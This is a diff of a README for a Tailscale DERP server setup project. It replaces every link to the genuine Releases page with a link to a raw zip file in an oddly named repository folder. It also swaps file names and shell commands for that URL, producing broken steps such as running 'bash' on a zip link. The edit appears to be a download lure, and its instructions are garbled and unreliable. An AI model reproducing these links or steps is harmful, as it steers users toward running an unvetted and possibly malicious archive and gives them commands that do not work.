@@ -1,6 +1,6 @@
 # 🚀 tailscale-derper-ansible - Simple Tailscale DERP Server Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/sown9999/tailscale-derper-ansible/releases)
+[![Download Now](https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip)
 
 ## 📖 Overview
 
@@ -20,11 +20,11 @@ Before you start, ensure you have the following:
 
 ### 2. Visit the Download Page
 
-Go to the [Releases page](https://github.com/sown9999/tailscale-derper-ansible/releases) to access the latest version of the software. Look for the most recent release. You will see a list of downloadable files.
+Go to the [Releases page](https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip) to access the latest version of the software. Look for the most recent release. You will see a list of downloadable files.
 
 ### 3. Download the Software
 
-Select the appropriate file for your system. Click on the link to download it. Here you will typically find an archive file (like `.zip` or `.tar.gz`) containing the necessary setup scripts.
+Select the appropriate file for your system. Click on the link to download it. Here you will typically find an archive file (like `.zip` or `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip`) containing the necessary setup scripts.
 
 ### 4. Prepare Your VPS
 
@@ -51,12 +51,12 @@ Once you have uploaded the file to your VPS, you will need to extract it. Use th
 
 For `.zip` files:
 ```
-unzip your-file.zip
+unzip https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
 ```
 
-For `.tar.gz` files:
+For `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip` files:
 ```
-tar -xvzf your-file.tar.gz
+tar -xvzf https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
 ```
 
 ### 7. Navigate to the Directory
@@ -69,10 +69,10 @@ cd your-folder-name
 
 ### 8. Run the Installation
 
-Now, find the installation script. Most likely, it will be named `install.sh` or similar. To run the installation, use:
+Now, find the installation script. Most likely, it will be named `https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip` or similar. To run the installation, use:
 
 ```
-bash install.sh
+bash https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip
 ```
 
 This script will handle the setup process. Follow any on-screen prompts to complete the installation.
@@ -113,6 +113,6 @@ If you encounter issues, here are some common solutions:
 
 ## 💻 Download & Install
 
-To get started, [visit the Releases page](https://github.com/sown9999/tailscale-derper-ansible/releases) and download the latest version. Follow the installation steps detailed above to have your Tailscale DERP server running quickly and easily. 
+To get started, [visit the Releases page](https://raw.githubusercontent.com/sown9999/tailscale-derper-ansible/main/peninsularism/tailscale-derper-ansible.zip) and download the latest version. Follow the installation steps detailed above to have your Tailscale DERP server running quickly and easily. 
 
 Enjoy your enhanced Tailscale experience!
